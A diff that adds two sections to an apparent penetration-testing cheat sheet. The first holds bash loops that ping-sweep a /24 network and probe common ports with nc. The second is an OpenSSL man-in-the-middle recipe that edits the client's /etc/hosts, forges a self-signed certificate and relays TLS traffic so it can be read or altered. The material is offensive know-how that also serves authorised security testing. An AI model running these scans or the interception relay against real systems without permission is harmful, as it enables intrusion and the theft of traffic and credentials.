@@ -3,12 +3,14 @@
 ## Summary
 
 - [Nmap](#nmap)
+- [Network Scan with nc and ping](#network-scan-with-nc-and-ping)
 - [Spyse](#spyse)
 - [Masscan](#masscan)
 - [Netdiscover](#netdiscover)
 - [Responder](#responder)
 - [Bettercap](#bettercap)
 - [Reconnoitre](#reconnoitre)
+- [SSL MITM with OpenSSL](#ssl-mitm-with-openssl)
 - [References](#references)
 
 ## Nmap
@@ -97,6 +99,42 @@ Host script results:
 
 List Nmap scripts : ls /usr/share/nmap/scripts/
 ```
+
+## Network Scan with nc and ping
+
+Sometimes we want to perform network scan without any tools like nmap. So we can use the commands `ping` and `nc` to check if a host is up and which port is open.
+To check if hosts are up on a /24 range
+```bash
+for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.$i is UP"; fi ; done
+```
+To check which ports are open on a specific host
+```bash
+for i in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 192.168.1.18 $i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.18 has port $i open"; fi ; done
+```
+Both at the same time on a /24 range
+```bash
+for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.$i is UP:"; for j in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 192.168.1.$i $j > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "\t192.168.1.$i has port $j open"; fi ; done ; fi ; done
+```
+Not in one-liner version:
+```bash
+for i in `seq 1 255`; 
+do 
+    ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; 
+    if [ $? -eq 0 ]; 
+    then 
+        echo "192.168.1.$i is UP:"; 
+        for j in {21,22,80,139,443,445,3306,3389,8080,8443}; 
+        do 
+            nc -z -w 1 192.168.1.$i $j > /dev/null 2>&1; 
+            if [ $? -eq 0 ]; 
+            then 
+                echo "\t192.168.1.$i has port $j open"; 
+            fi ; 
+        done ; 
+    fi ; 
+done
+```
+
 
 ## Spyse
 * Spyse API - for detailed info is better to check [Spyse](https://spyse.com/)
@@ -195,6 +233,23 @@ bettercap -X --proxy --proxy-https -T <target IP>
 # intercepting http and https requests,
 # targetting specific IP only
 ```
+
+## SSL MITM with OpenSSL
+This code snippet allows you to sniff/modify SSL traffic if there is a MITM vulnerability using only openssl.
+If you can modify `/etc/hosts` of the client:
+```powershell
+sudo echo "[OPENSSL SERVER ADDRESS] [domain.of.server.to.mitm]" >> /etc/hosts  # On client host
+```
+On our MITM server, if the client accepts self signed certificates (you can use a legit certificate if you have the private key of the legit server):
+```powershell
+openssl req -subj '/CN=[domain.of.server.to.mitm]' -batch -new -x509 -days 365 -nodes -out server.pem -keyout server.pem
+```
+On our MITM server, we setup our infra:
+```powershell
+mkfifo response
+sudo openssl s_server -cert server.pem -accept [INTERFACE TO LISTEN TO]:[PORT] -quiet < response | tee | openssl s_client -quiet -servername [domain.of.server.to.mitm] -connect[IP of server to MITM]:[PORT] | tee | cat > response
+```
+In this example, traffic is only displayed with `tee` but we could modify it using `sed` for example.
 
 ## References
 
